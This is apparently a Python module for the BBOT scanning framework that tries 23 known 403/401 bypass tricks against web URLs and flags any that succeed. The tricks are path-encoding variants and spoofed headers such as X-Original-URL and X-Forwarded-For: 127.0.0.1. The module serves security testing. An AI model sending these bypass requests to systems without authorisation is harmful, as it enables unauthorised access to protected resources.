from .base import BaseModule
from bbot.core.errors import HttpCompareError

"""
Port of https://github.com/iamj0ker/bypass-403/
"""

# ([int]id,[string]method,[string]path,[dictionary]header,[bool]strip trailing slash)
signatures = [
    (1, "GET", "###SCHEME###://###NETLOC###/%2e/###PATH###", None, False),
    (2, "GET", "###SCHEME###://###NETLOC###/###PATH###/.", None, True),
    (3, "GET", "###SCHEME###://###NETLOC###//###PATH###//", None, True),
    (4, "GET", "###SCHEME###://###NETLOC###/./###PATH###/./", None, True),
    (5, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Original-URL": "###PATH###"}, False),
    (6, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Custom-IP-Authorization": "127.0.0.1"}, False),
    (7, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Forwarded-For": "http://127.0.0.1"}, False),
    (8, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Forwarded-For": "127.0.0.1:80"}, False),
    (9, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-rewrite-url": "nonsense"}, False),
    (10, "GET", "###SCHEME###://###NETLOC###/###PATH###%20", None, True),
    (11, "GET", "###SCHEME###://###NETLOC###/###PATH###%09", None, True),
    (12, "GET", "###SCHEME###://###NETLOC###/###PATH###?", None, True),
    (13, "GET", "###SCHEME###://###NETLOC###/###PATH###.html", None, False),
    (14, "GET", "###SCHEME###://###NETLOC###/###PATH###/?anything", None, True),
    (15, "GET", "###SCHEME###://###NETLOC###/###PATH####", None, False),
    (16, "POST", "###SCHEME###://###NETLOC###/###PATH###", {"Content-Length": "0"}, False),
    (17, "GET", "###SCHEME###://###NETLOC###/###PATH###/*", None, True),
    (18, "GET", "###SCHEME###://###NETLOC###/###PATH###.php", None, False),
    (19, "GET", "###SCHEME###://###NETLOC###/###PATH###.json", None, False),
    (20, "GET", "###SCHEME###://###NETLOC###/###PATH###", {"X-Host": "127.0.0.1"}, False),
    (21, "GET", "###SCHEME###://###NETLOC###/###PATH###..;/", None, False),
    (22, "GET", "###SCHEME###://###NETLOC###/###PATH###;/", None, False),
    (23, "TRACE", "###SCHEME###://###NETLOC###/###PATH###/", None, True),
]


class bypass403(BaseModule):

    watched_events = ["URL"]
    produced_events = ["VULNERABILITY"]
    flags = ["active"]

    def handle_event(self, event):

        try:
            compare_helper = self.helpers.http_compare(event.data, allow_redirects=True)
        except HttpCompareError as e:
            self.debug(e)
            return

        for sig in signatures:

            sig = self.format_signature(sig, event)
            if sig[3] != None:
                headers = sig[3]
            else:
                headers = None
            match, reason, reflection, subject_response = compare_helper.compare(
                sig[2], headers=headers, method=sig[1], allow_redirects=True
            )

            if match == False:
                if str(subject_response.status_code)[0] != "4":
                    self.emit_event(
                        f"403 Bypass [{event.data}] Reason: [{reason}] Sig: [{str(sig[0])}]",
                        "VULNERABILITY",
                        source=event,
                        tags=["medium"],
                    )
                else:
                    self.debug(f"Status code changed to {str(subject_response.status_code)}, ignoring")

    def filter_event(self, event):
        if ("status-403" in event.tags) or ("status-401" in event.tags):
            return True
        return False

    def format_signature(self, sig, event):
        if sig[4] == True:
            cleaned_path = event.parsed.path.strip("/")
        else:
            cleaned_path = event.parsed.path.lstrip("/")
        formatted_url = (
            sig[2]
            .replace("###SCHEME###", event.parsed.scheme)
            .replace("###NETLOC###", event.parsed.netloc)
            .replace("###PATH###", cleaned_path)
        )
        if sig[3] != None:
            formatted_headers = {k: v.format(event=event) for k, v in sig[3].items()}
        else:
            formatted_headers = None
        return (sig[0], sig[1], formatted_url, formatted_headers)
